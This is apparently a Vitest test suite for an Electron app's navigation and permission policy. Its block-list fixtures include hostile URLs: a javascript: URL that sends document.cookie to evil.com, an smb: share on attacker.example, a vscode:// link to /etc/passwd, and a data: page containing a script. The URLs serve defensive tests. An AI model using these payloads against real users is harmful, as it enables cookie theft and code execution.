// main.mjs against an in-memory electron (fake-electron.ts): the window, app lifecycle, permissions and
// how each navigation hook applies the URL policy. Updates are in main.update.test.ts.
import { existsSync } from "node:fs";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import fc from "fast-check";
import {
  afterEach,
  beforeEach,
  describe,
  expect,
  it,
  it as test,
  vi,
} from "vitest";
import { type FakeElectron, fakeElectron, flush } from "./fake-electron";
import { navigationPolicy } from "./url-policy.mjs";

const HUB = "https://app.busybot.dev";
const ICON = join(fileURLToPath(new URL(".", import.meta.url)), "icon.png");
const present = <T>(value: T | undefined): T => {
  if (value === undefined) {
    throw new Error("Expected a present test value");
  }
  return value;
};

let fake: FakeElectron;
const savedEnv = process.env.BUSY_URL;
const savedPlatform = present(
  Object.getOwnPropertyDescriptor(process, "platform")
);

async function boot(
  opts: Parameters<typeof fakeElectron>[0] & {
    hub?: string;
    ready?: boolean;
  } = {}
) {
  fake = fakeElectron({ packaged: false, ...opts });
  if (opts.hub === undefined) {
    delete process.env.BUSY_URL;
  } else {
    process.env.BUSY_URL = opts.hub;
  }
  vi.resetModules();
  vi.doMock("electron", () => fake.module);
  await import("./main.mjs");
  if (opts.ready !== false) {
    fake.ready();
    await flush();
  }
  return fake;
}

const win = () => {
  // biome-ignore lint/suspicious/noMisplacedAssertion: this helper validates the fixture before returning it
  expect(fake.windows).toHaveLength(1);
  const [window] = fake.windows;
  if (!window) {
    throw new Error("Expected a fake window");
  }
  return window;
};

beforeEach(() => {
  // main.mjs schedules a 6-hour update interval; keep it off the real clock.
  vi.useFakeTimers({
    toFake: ["setInterval", "clearInterval", "setTimeout", "clearTimeout"],
  });
});

afterEach(() => {
  vi.useRealTimers();
  vi.doUnmock("electron");
  if (savedEnv === undefined) {
    delete process.env.BUSY_URL;
  } else {
    process.env.BUSY_URL = savedEnv;
  }
  Object.defineProperty(process, "platform", savedPlatform);
});

describe("main window", () => {
  it("creates nothing until electron is ready", async () => {
    await boot({ ready: false });
    await flush();
    expect(fake.windows).toHaveLength(0);
    expect(
      fake.session.defaultSession.setPermissionRequestHandler
    ).not.toHaveBeenCalled();
  });

  it("opens exactly one window once ready", async () => {
    await boot();
    expect(fake.windows).toHaveLength(1);
  });

  it("loads the production hub when BUSY_URL is unset", async () => {
    await boot();
    expect(win().loadURL).toHaveBeenCalledWith(HUB);
  });

  it.each([
    ["a local dev hub", "http://localhost:3000"],
    ["a portless .localhost hub", "https://busy.localhost"],
    ["a preview deployment", "https://busy-git-main-matisolina.vercel.app"],
  ])("loads %s from BUSY_URL", async (_label, hub) => {
    await boot({ hub });
    expect(win().loadURL).toHaveBeenCalledWith(hub);
    expect(win().loadURL).toHaveBeenCalledTimes(1);
  });

  it("starts hidden and shows only when the page is ready to paint", async () => {
    await boot();
    expect(win().options.show).toBe(false);
    expect(win().show).not.toHaveBeenCalled();
    win().emit("ready-to-show");
    expect(win().show).toHaveBeenCalledTimes(1);
  });

  it("shows the window once even if ready-to-show fires again", async () => {
    await boot();
    win().emit("ready-to-show");
    win().emit("ready-to-show");
    expect(win().show).toHaveBeenCalledTimes(1);
  });

  it.each([
    ["isolates the page from the preload context", "contextIsolation", true],
    ["sandboxes the renderer", "sandbox", true],
    ["gives the page no Node.js", "nodeIntegration", false],
  ])("%s", async (_label, key, value) => {
    await boot();
    expect(win().options.webPreferences[key]).toBe(value);
  });

  it("uses the icon shipped next to main.mjs, for the window and the dock", async () => {
    await boot();
    expect(win().options.icon).toBe(ICON);
    expect(existsSync(ICON)).toBe(true);
    expect(fake.app.dock?.setIcon).toHaveBeenCalledWith(ICON);
  });

  it("starts without a dock (non-macOS)", async () => {
    await boot({ dock: false });
    expect(fake.windows).toHaveLength(1);
  });

  it("injects the title-bar CSS after every page load, not just the first", async () => {
    await boot();
    expect(win().webContents.insertCSS).not.toHaveBeenCalled();
    win().webContents.emit("did-finish-load");
    win().webContents.emit("did-finish-load");
    expect(win().webContents.insertCSS).toHaveBeenCalledTimes(2);
  });
});

describe("app lifecycle", () => {
  it("keeps running when it holds the single-instance lock", async () => {
    await boot();
    expect(fake.app.requestSingleInstanceLock).toHaveBeenCalledTimes(1);
    expect(fake.app.exit).not.toHaveBeenCalled();
  });

  it("exits with status 0 when another instance already runs", async () => {
    await boot({ lock: false, ready: false });
    expect(fake.app.exit).toHaveBeenCalledWith(0);
    expect(fake.app.quit).not.toHaveBeenCalled();
  });

  it("asks for the lock before anything else happens", async () => {
    await boot({ lock: false });
    expect(fake.calls[0]).toBe("exit 0");
  });

  it("brings the existing window forward when a second instance starts", async () => {
    await boot();
    fake.app.emit("second-instance");
    expect(win().focus).toHaveBeenCalledTimes(1);
    expect(win().restore).not.toHaveBeenCalled();
  });

  it("restores a minimized window before focusing it", async () => {
    await boot();
    win().minimized = true;
    fake.app.emit("second-instance");
    expect(fake.calls.slice(-2)).toEqual(["restore", "focus"]);
  });

  it("ignores a second instance when no window is open", async () => {
    await boot();
    win().closed = true;
    expect(() => fake.app.emit("second-instance")).not.toThrow();
    expect(win().focus).not.toHaveBeenCalled();
  });

  it("ignores a second instance that arrives before the window exists", async () => {
    await boot({ ready: false });
    expect(() => fake.app.emit("second-instance")).not.toThrow();
  });

  it("reopens a window when the dock icon is clicked and none is open", async () => {
    await boot();
    win().closed = true;
    fake.app.emit("activate");
    expect(fake.windows).toHaveLength(2);
    expect(fake.windows[1]?.loadURL).toHaveBeenCalledWith(HUB);
  });

  it("wires the same policy into a reopened window", async () => {
    await boot();
    win().closed = true;
    fake.app.emit("activate");
    const reopened = present(fake.windows[1]);
    const event = {
      isMainFrame: true,
      preventDefault: vi.fn(),
      url: "https://github.com/",
    };
    reopened.webContents.emit("will-navigate", event, event.url);
    expect(event.preventDefault).toHaveBeenCalled();
    expect(fake.shell.openExternal).toHaveBeenCalledWith("https://github.com/");
  });

  it("does not open a second window on activate while one is open", async () => {
    await boot();
    fake.app.emit("activate");
    expect(fake.windows).toHaveLength(1);
  });

  it("does not open a window on activate before electron is ready", async () => {
    await boot({ ready: false });
    fake.app.emit("activate");
    expect(fake.windows).toHaveLength(0);
  });

  it.each([
    ["linux", true],
    ["win32", true],
    ["darwin", false],
  ])("on %s, closing the last window quits: %s", async (platform, quits) => {
    await boot();
    Object.defineProperty(process, "platform", {
      ...savedPlatform,
      value: platform,
    });
    fake.app.emit("window-all-closed");
    expect(fake.app.quit).toHaveBeenCalledTimes(quits ? 1 : 0);
  });
});

describe("permissions", () => {
  const PERMISSIONS = [
    "media",
    "notifications",
    "geolocation",
    "clipboard-read",
    "clipboard-sanitized-write",
    "display-capture",
    "openExternal",
    "fullscreen",
    "pointerLock",
    "midi",
  ];

  it("installs both handlers before the hub page starts loading", async () => {
    await boot();
    const order = fake.calls.filter(
      (c) => c.startsWith("setPermission") || c.startsWith("loadURL")
    );
    expect(order).toEqual([
      "setPermissionRequestHandler",
      "setPermissionCheckHandler",
      `loadURL ${HUB}`,
    ]);
  });

  it.each(PERMISSIONS)(
    "denies a %s request from the hub",
    async (permission) => {
      await boot();
      const done = vi.fn();
      fake.perms.request?.({ getURL: () => HUB }, permission, done, {
        requestingUrl: `${HUB}/`,
      });
      expect(done).toHaveBeenCalledWith(false);
    }
  );

  it.each(PERMISSIONS)("reports %s as not granted", async (permission) => {
    await boot();
    expect(
      fake.perms.check?.({ getURL: () => HUB }, permission, HUB, {
        requestingUrl: `${HUB}/`,
      })
    ).toBe(false);
  });

  it("answers every request exactly once", async () => {
    await boot();
    const done = vi.fn();
    fake.perms.request?.({}, "media", done, {});
    expect(done).toHaveBeenCalledTimes(1);
  });
});

// Each kind of navigation as Electron reports it. `prevented`/`opened` say what the app did with it.
interface Outcome {
  action?: string;
  opened: string[];
  prevented: boolean;
}
const kinds: Record<string, (url: string) => Outcome> = {
  // A link click in the page: Electron emits will-frame-navigate for the main frame and will-navigate.
  "a link click": (url) => {
    const before = fake.shell.openExternal.mock.calls.length;
    const frameEvent = {
      isMainFrame: true,
      isSameDocument: false,
      preventDefault: vi.fn(),
      url,
    };
    win().webContents.emit("will-frame-navigate", frameEvent);
    const event = {
      isMainFrame: true,
      isSameDocument: false,
      preventDefault: vi.fn(),
      url,
    };
    win().webContents.emit("will-navigate", event, url, false, true, 1, 1);
    const prevented =
      event.preventDefault.mock.calls.length +
        frameEvent.preventDefault.mock.calls.length >
      0;
    return {
      opened: fake.shell.openExternal.mock.calls.slice(before).map((c) => c[0]),
      prevented,
    };
  },
  "a new window": (url) => {
    const handler = present(win().webContents.openHandler);
    const before = fake.shell.openExternal.mock.calls.length;
    const { action } = handler({
      disposition: "foreground-tab",
      features: "",
      frameName: "",
      url,
    });
    return {
      action,
      opened: fake.shell.openExternal.mock.calls.slice(before).map((c) => c[0]),
      prevented: action === "deny",
    };
  },
  "a server redirect": (url) => {
    const before = fake.shell.openExternal.mock.calls.length;
    const event = {
      isMainFrame: true,
      isSameDocument: false,
      preventDefault: vi.fn(),
      url,
    };
    win().webContents.emit("will-redirect", event, url, false, true, 1, 1);
    return {
      opened: fake.shell.openExternal.mock.calls.slice(before).map((c) => c[0]),
      prevented: event.preventDefault.mock.calls.length > 0,
    };
  },
  "an iframe navigation": (url) => {
    const before = fake.shell.openExternal.mock.calls.length;
    const event = {
      isMainFrame: false,
      isSameDocument: false,
      preventDefault: vi.fn(),
      url,
    };
    win().webContents.emit("will-frame-navigate", event);
    return {
      opened: fake.shell.openExternal.mock.calls.slice(before).map((c) => c[0]),
      prevented: event.preventDefault.mock.calls.length > 0,
    };
  },
};

const ALLOW = [
  { label: "the hub root", url: `${HUB}/` },
  { label: "a chat deep link", url: `${HUB}/b/abogado#m-1` },
  {
    label: "the login page carrying an external redirect",
    url: `${HUB}/login?next=https://evil.com`,
  },
  {
    label: "the hub in upper case with its default port",
    url: "HTTPS://APP.BUSYBOT.DEV:443/x",
  },
];
const EXTERNAL = [
  { label: "another site", url: "https://github.com/matisolina" },
  { label: "the legacy hub alias", url: "https://busy.matisolina.com/" },
  { label: "a look-alike host", url: "https://app.busybot.dev.evil.com/" },
  { label: "a subdomain of the hub", url: "https://docs.app.busybot.dev/" },
  {
    label: "the hub on another port",
    url: "https://app.busybot.dev:8443/",
  },
  {
    label: "a site that quotes the hub URL",
    url: `https://evil.com/?u=${HUB}`,
  },
  {
    label: "an OAuth consent page",
    url: "https://accounts.google.com/o/oauth2/v2/auth?client_id=x",
  },
  {
    label: "a Vercel dashboard link",
    url: "https://vercel.com/matisolina/busy-hub/deployments",
  },
];
const BLOCK = [
  { label: "the hub downgraded to http", url: "http://app.busybot.dev/" },
  {
    label: "javascript:",
    url: "javascript:fetch('//evil.com?c='+document.cookie)",
  },
  {
    label: "a file: URL to an app",
    url: "file:///System/Applications/Calculator.app",
  },
  {
    label: "a data: HTML page",
    url: "data:text/html,<script>alert(1)</script>",
  },
  {
    label: "an smb: share (mounts and can run code)",
    url: "smb://attacker.example/share",
  },
  { label: "another app's URL scheme", url: "vscode://file/etc/passwd" },
  {
    label: "a System Settings pane",
    url: "x-apple.systempreferences:com.apple.preference.security",
  },
  {
    label: "a blob: from another origin",
    url: "blob:https://evil.com/6f1c2b0e",
  },
  { label: "ftp:", url: "ftp://example.com/file" },
  { label: "garbage", url: "not a url" },
  // Ambiguous: mail and phone links count as non-https and are dropped too, not handed to Mail or FaceTime.
  { label: "mailto:", url: "mailto:soporte@matisolina.com" },
  { label: "tel:", url: "tel:+5491100000000" },
];

describe.each(Object.keys(kinds))("%s", (kind) => {
  const go = (url: string) => kinds[kind]?.(url);

  test.each(ALLOW)("keeps $label in the app", async ({ url }) => {
    await boot();
    const r = go(url);
    // Ambiguous: a new window is always denied and optionally opened externally; other navigation stays in the app.
    const actual =
      kind === "a new window"
        ? { action: r.action, opened: r.opened, prevented: r.prevented }
        : { opened: r.opened, prevented: r.prevented };
    const expected =
      kind === "a new window"
        ? { action: "deny", opened: [url], prevented: true }
        : { opened: [], prevented: false };
    expect(actual).toEqual(expected);
  });

  test.each(EXTERNAL)("sends $label to the browser, once", async ({ url }) => {
    await boot();
    const r = go(url);
    expect(r.prevented).toBe(true);
    expect(r.opened).toEqual([url]);
  });

  test.each(BLOCK)("drops $label", async ({ url }) => {
    await boot();
    const r = go(url);
    expect(r.prevented).toBe(true);
    expect(r.opened).toEqual([]);
  });
});

describe("a redirect inside an iframe", () => {
  const redirect = (url: string) => {
    const event = {
      isMainFrame: false,
      isSameDocument: false,
      preventDefault: vi.fn(),
      url,
    };
    win().webContents.emit("will-redirect", event, url, false, false, 1, 2);
    return event;
  };

  it("is left alone when a PDF iframe redirects to its signed Blob URL", async () => {
    await boot();
    const event = redirect(
      "https://abc123.private.blob.vercel-storage.com/files/report.pdf?token=t"
    );
    expect(event.preventDefault).not.toHaveBeenCalled();
    expect(fake.shell.openExternal).not.toHaveBeenCalled();
  });

  it.each([...EXTERNAL, ...BLOCK])(
    "is not handed to the browser for $label",
    async ({ url }) => {
      await boot();
      const event = redirect(url);
      expect(event.preventDefault).not.toHaveBeenCalled();
      expect(fake.shell.openExternal).not.toHaveBeenCalled();
    }
  );

  it("sends the same Blob URL to the browser when the whole window is redirected there", async () => {
    await boot();
    const url =
      "https://abc123.private.blob.vercel-storage.com/files/report.pdf?token=t";
    expect(present(kinds["a server redirect"])(url)).toEqual({
      opened: [url],
      prevented: true,
    });
  });
});

describe("navigation hooks", () => {
  it("installs each navigation hook exactly once", async () => {
    await boot();
    const wc = win().webContents;
    for (const event of [
      "will-navigate",
      "will-redirect",
      "will-frame-navigate",
      "did-finish-load",
    ]) {
      expect(wc.listenerCount(event), event).toBe(1);
    }
    expect(wc.setWindowOpenHandler).toHaveBeenCalledTimes(1);
  });

  it("passes the URL to the browser unchanged", async () => {
    await boot();
    const url = "https://example.com/a%20b?q=1&r=%C3%A9#frag";
    present(kinds["a link click"])(url);
    expect(fake.shell.openExternal).toHaveBeenCalledWith(url);
  });
});

describe("with BUSY_URL pointing at a dev hub", () => {
  const DEV = "http://localhost:3000";

  it.each(["a link click", "a server redirect", "an iframe navigation"])(
    "keeps the dev hub's http pages in the app (%s)",
    async (kind) => {
      await boot({ hub: DEV });
      expect(kinds[kind]?.(`${DEV}/c/1`)).toEqual({
        opened: [],
        prevented: false,
      });
    }
  );

  it("hands a dev hub page asked for in a new window to the browser, not dropping it as http", async () => {
    await boot({ hub: DEV });
    expect(present(kinds["a new window"])(`${DEV}/c/1`)).toEqual({
      action: "deny",
      opened: [`${DEV}/c/1`],
      prevented: true,
    });
  });

  it.each(["a link click", "a server redirect", "an iframe navigation"])(
    "sends production to the browser (%s)",
    async (kind) => {
      await boot({ hub: DEV });
      expect(kinds[kind]?.(`${HUB}/`)).toEqual({
        opened: [`${HUB}/`],
        prevented: true,
      });
    }
  );

  it.each(["a link click", "a server redirect", "an iframe navigation"])(
    "drops http on another local port (%s)",
    async (kind) => {
      await boot({ hub: DEV });
      expect(kinds[kind]?.("http://localhost:3001/")).toEqual({
        opened: [],
        prevented: true,
      });
    }
  );
});

// The hooks against the policy itself, over generated URLs: whatever navigationPolicy says, each hook acts on it.
describe("every hook follows navigationPolicy", () => {
  const urlArb = fc
    .tuple(
      fc.constantFrom(
        "https://",
        "http://",
        "HTTPS://",
        "javascript:",
        "file://",
        "data:text/html,",
        "blob:https://",
        "smb://",
        ""
      ),
      fc.constantFrom(
        "app.busybot.dev",
        "app.busybot.dev:443",
        "busy.matisolina.com",
        "app.busybot.dev.evil.com",
        "evil.com",
        "a.app.busybot.dev",
        "[::1]"
      ),
      fc.webPath()
    )
    .map(([scheme, host, path]) => `${scheme}${host}${path}`);

  it.each(Object.keys(kinds))("%s", async (kind) => {
    await boot();
    const seen = new Set<string>();
    fc.assert(
      fc.property(urlArb, (url) => {
        const policy = navigationPolicy(url, HUB);
        seen.add(policy);
        const r = kinds[kind]?.(url);
        const actual =
          kind === "a new window"
            ? { action: r.action, opened: r.opened }
            : { opened: r.opened, prevented: r.prevented };
        const expected =
          kind === "a new window"
            ? { action: "deny", opened: policy === "block" ? [] : [url] }
            : {
                opened: policy === "external" ? [url] : [],
                prevented: policy !== "allow",
              };
        expect(actual).toEqual(expected);
      }),
      { numRuns: 150, seed: 11 }
    );
    expect([...seen].sort()).toEqual(["allow", "block", "external"]);
  });
});
